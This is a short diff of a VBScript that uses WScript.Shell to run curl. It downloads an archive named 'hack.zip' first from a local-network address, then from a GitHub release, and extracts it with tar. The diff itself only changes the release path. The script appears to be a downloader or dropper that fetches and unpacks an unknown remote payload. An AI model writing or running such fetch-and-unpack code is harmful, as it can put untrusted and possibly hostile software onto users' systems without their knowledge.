@@ -2,9 +2,8 @@ set objShell = CreateObject("WScript.shell")
 set objExeCurl = objShell.Exec("curl -O  http://192.168.1.34:8080/hack.zip")
 
 If objExeCurl.ExitCode=0 Then
-	set objExeCurl2 = objShell.Exec("curl -LOJ https://github.com/Rahilkzi/practon/releases/download/release/hack.zip")
+	set objExeCurl2 = objShell.Exec("curl -LOJ https://github.com/Rahilkzi/practon/releases/download/v1/hack.zip")
 End If
-
 WScript.Sleep 5000
 If objExeCurl2.ExitCode=0 Then
 	set objExeTar = objShell.Exec("tar -xf hack.zip")
